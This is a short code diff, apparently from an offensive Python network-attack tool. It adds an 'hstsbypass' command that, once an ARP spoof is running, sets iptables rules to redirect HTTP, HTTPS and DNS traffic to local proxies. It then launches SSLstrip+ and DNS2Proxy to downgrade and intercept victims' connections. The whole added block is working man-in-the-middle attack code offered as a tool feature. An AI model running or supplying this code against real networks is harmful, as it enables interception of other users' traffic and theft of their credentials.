@@ -74,6 +74,22 @@ class Processor(object):
 					if self.input_list[0] == "help":
 						print_help()
 
+					elif self.command == "hstsbypass":
+						if self.arpspoof_status:
+							print "[*] SSLstrip+ initialized"
+							print "      |_by: LeonardoNve && M.Marlinspike"
+							print "[*] DNS2Proxy initialized"
+							print "      |_by: LeonardoNve"
+							os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000")
+							os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
+							os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8000")
+			                        	with open("log/sslstrip.log", "a+") as stdout:
+                                				self.p = subprocess.Popen(["python sslstrip2/sslstrip.py -l 8000"], shell=True, stdout=stdout, stderr=stdout)
+							with open("log/dns2proxy.log","a+") as stdout:
+								self.p = subprocess.Popen(["python dns2proxy/dns2proxy.py"], shell=True, stdout=stdout, stderr=stdout)
+						else:
+							print "[!] You need to start an ARP spoof attack first."
+
 					elif self.command == "jarvis":
 						self.Jarvis.start('core/processor.py')
 	                                        self.jarvis_status = 1
